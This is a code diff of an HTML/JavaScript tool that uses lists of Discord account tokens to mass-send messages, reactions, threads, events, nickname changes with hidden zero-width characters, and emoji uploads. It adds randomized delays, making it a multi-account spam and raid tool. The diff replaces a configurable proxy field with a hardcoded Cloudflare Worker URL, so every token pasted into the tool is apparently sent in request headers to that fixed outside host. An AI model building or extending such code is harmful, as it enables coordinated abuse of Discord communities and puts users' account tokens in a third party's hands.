@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>token tool</title>
+<title>AARR Tool - Advanced Interface</title>
 <style>
   :root { --bg: #0a0a0a; --panel: #141414; --border: #333; --text: #eaeaea; --accent: #00ffaa; --hover: #00cc88; }
   body { margin: 0; padding: 0; background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; display: flex; height: 100vh; overflow: hidden; }
@@ -51,8 +51,6 @@
     <div id="sec-core" class="section active">
       <div class="card">
         <h2>主要設定</h2>
-        <label>Cloudflare Worker URL</label>
-        <input type="text" id="worker_url" placeholder="https://tiny-water-6033.s103765s103765.workers.dev/">
         <label>T: (Tokenリスト 1行に1つ)</label>
         <textarea id="tokens" style="height: 120px;" placeholder="token1&#10;token2"></textarea>
       </div>
@@ -238,6 +236,10 @@
 </div>
 
 <script>
+
+const WORKER_URL = "https://tiny-water-6033.s103765s103765.workers.dev/";
+
+
 const D = document;
 const v = id => D.getElementById(id).value;
 const c = id => D.getElementById(id).checked;
@@ -260,8 +262,11 @@ D.querySelectorAll('.nav-btn').forEach(b => {
 });
 
 const req = async (ep, m, b, t) => {
-  const w = v('worker_url');
-  if(!w) { lg('エラー: Worker URLが未設定です'); return null; }
+  const w = WORKER_URL;
+  if(!w || w === "ここにあなたのCloudflare WorkerのURLを貼り付けてください") { 
+    lg('エラー: コード内のWorker URLが設定されていません。HTMLファイルを編集して設定してください。'); 
+    return null; 
+  }
   return fetch(w, {
     method: 'POST',
     body: JSON.stringify({ ep, m, h: { 'Authorization': t, 'Content-Type': 'application/json' }, b })
@@ -307,7 +312,7 @@ D.getElementById('btn_msg_send').onclick = async () => {
           duration: parseInt(v('poll_duration')) || 24
         };
       }
-      req(`/channels/${ch}/messages`, 'POST', b, t).then(res => lg(`送信 [${res.status}]`));
+      req(`/channels/${ch}/messages`, 'POST', b, t).then(res => res && lg(`送信 [${res.status}]`));
       await wait(c('opt_autodelay') ? del + Math.random()*800 : del);
     }
   }
@@ -315,7 +320,7 @@ D.getElementById('btn_msg_send').onclick = async () => {
 
 D.getElementById('btn_msg_type').onclick = () => {
   let ch = v('channel_id');
-  getT().forEach(t => req(`/channels/${ch}/typing`, 'POST', null, t).then(res => lg(`入力中 [${res.status}]`)));
+  getT().forEach(t => req(`/channels/${ch}/typing`, 'POST', null, t).then(res => res && lg(`入力中 [${res.status}]`)));
 };
 
 D.getElementById('btn_transfer').onclick = async () => {
@@ -327,8 +332,8 @@ D.getElementById('btn_transfer').onclick = async () => {
       let r = await req(`/channels/${v('t_channel')}/messages/${v('t_msg')}`, 'GET', null, t);
       if(r && r.ok) {
         let j = await r.json();
-        req(`/channels/${v('channel_id')}/messages`, 'POST', { content: j.content }, t).then(res => lg(`転送 [${res.status}]`));
-      } else { lg('転送エラー: メッセージの取得に失敗しました'); }
+        req(`/channels/${v('channel_id')}/messages`, 'POST', { content: j.content }, t).then(res => res && lg(`転送 [${res.status}]`));
+      } else if(r) { lg('転送エラー: メッセージの取得に失敗しました'); }
       await wait(del);
     }
   }
@@ -343,7 +348,7 @@ D.getElementById('btn_react').onclick = async () => {
   let toks = getT();
   for(let e of all) {
     for(let t of toks) {
-      req(`/channels/${ch}/messages/${msg}/reactions/${encodeURIComponent(e.trim())}/@me`, 'PUT', null, t).then(res => lg(`リアクション [${res.status}]`));
+      req(`/channels/${ch}/messages/${msg}/reactions/${encodeURIComponent(e.trim())}/@me`, 'PUT', null, t).then(res => res && lg(`リアクション [${res.status}]`));
       await wait(del);
     }
   }
@@ -356,7 +361,7 @@ D.getElementById('btn_thread').onclick = async () => {
   for(let i=0; i<cnt; i++) {
     for(let t of toks) {
       let b = { name: v('th_title'), type: parseInt(v('th_type')), message: { content: v('th_msg') } };
-      req(`/channels/${v('channel_id')}/threads`, 'POST', b, t).then(res => lg(`スレッド [${res.status}]`));
+      req(`/channels/${v('channel_id')}/threads`, 'POST', b, t).then(res => res && lg(`スレッド [${res.status}]`));
       await wait(del);
     }
   }
@@ -366,7 +371,7 @@ D.getElementById('btn_nick').onclick = () => {
   let nn = v('nick_new');
   if(c('nick_stealth')) nn += ZW[0];
   let sid = v('server_id');
-  getT().forEach(t => req(`/guilds/${sid}/members/@me`, 'PATCH', { nick: nn }, t).then(res => lg(`ニックネーム [${res.status}]`)));
+  getT().forEach(t => req(`/guilds/${sid}/members/@me`, 'PATCH', { nick: nn }, t).then(res => res && lg(`ニックネーム [${res.status}]`)));
 };
 
 D.getElementById('btn_event').onclick = async () => {
@@ -377,7 +382,7 @@ D.getElementById('btn_event').onclick = async () => {
   for(let i=0; i<cnt; i++) {
     for(let t of toks) {
       let b = { name: v('ev_name'), description: v('ev_desc'), privacy_level: 2, entity_type: 3, entity_metadata: { location: v('ev_loc') }, scheduled_start_time: v('ev_start'), scheduled_end_time: v('ev_end') };
-      req(`/guilds/${sid}/scheduled-events`, 'POST', b, t).then(res => lg(`イベント [${res.status}]`));
+      req(`/guilds/${sid}/scheduled-events`, 'POST', b, t).then(res => res && lg(`イベント [${res.status}]`));
       await wait(del);
     }
   }
@@ -385,7 +390,7 @@ D.getElementById('btn_event').onclick = async () => {
 
 D.getElementById('btn_emoji').onclick = () => {
   let sid = v('em_server') || v('server_id');
-  getT().forEach(t => req(`/guilds/${sid}/emojis`, 'POST', { name: v('em_name'), image: v('em_url') }, t).then(res => lg(`絵文字 [${res.status}]`)));
+  getT().forEach(t => req(`/guilds/${sid}/emojis`, 'POST', { name: v('em_name'), image: v('em_url') }, t).then(res => res && lg(`絵文字 [${res.status}]`)));
 };
 
 lg('ステータス: 準備完了');
